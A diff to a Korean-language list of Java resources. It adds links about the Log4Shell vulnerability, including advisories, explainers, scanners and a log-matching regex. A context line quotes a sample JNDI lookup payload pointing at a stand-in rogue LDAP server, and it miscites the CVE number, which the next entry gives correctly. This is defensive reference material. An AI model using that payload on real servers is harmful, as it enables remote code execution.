@@ -1172,9 +1172,14 @@ Java
     * 12월 9일 Log4j에서 `${jndi:ldap://rogueldapserver.com/a}`같은 문자열을 로그로 남기게 해서 원격 코드를 실행(RCE, remote code execution)할 수 있게 하는 치명적인 취약점 CVE-2021-4422 발견. Log4j 2.0부터 2.14.1에서 발생
   * [Log4Shell Update: Second log4j Vulnerability Published (CVE-2021-44228 + CVE-2021-45046) | LunaSec](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)
     * CVE-2021-44228에 이어 추가로 발견된 CVE-2021-45046 취약점. Log4j를 업그레이드하지 않고 noMsgFormatLookups 플래그를 활성화하거나 %m{nolookups}를 설정했을 때 ThreadContext에 데이터를 저장한다면 공격자가 데이터를 제어 가능. 2.7.0에서 2.14.1까지 존재
+  * [Google Online Security Blog: Understanding the Impact of Apache Log4j Vulnerability](https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html)
+  * [기고ㅣ애플리케이션에서 ‘Log4j’ 취약점을 탐지하는 방법 - CIO Korea](https://www.ciokorea.com/news/218539)
+  * [Tech Solvency: The Story So Far: CVE-2021-44228 (Log4Shell log4j vulnerability).](https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/)
+  * [log4j: between a rock and a hard place](https://crawshaw.io/blog/log4j)
   * log4j2-scan [CVE-2021-44228-Scanner/README.md at main · logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner/blob/main/README.md)
   * [Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package | LunaSec](https://www.lunasec.io/docs/blog/log4j-zero-day/)
     * [log4shell-tester](https://github.com/huntresslabs/log4shell-tester)
+  * [log4shell-rex: PCRE RegEx matching Log4Shell CVE-2021-44228 IOC in your logs](https://github.com/back2root/log4shell-rex)
 * [lombok](https://projectlombok.org)
   * [자바모델 클래스에 날개를달자 롬복(Lombok)](http://www.slideshare.net/topcredu/lombok-66365719)
   * [Lombok 사용상 주의점(Pitfall)](http://kwonnam.pe.kr/wiki/java/lombok/pitfall)
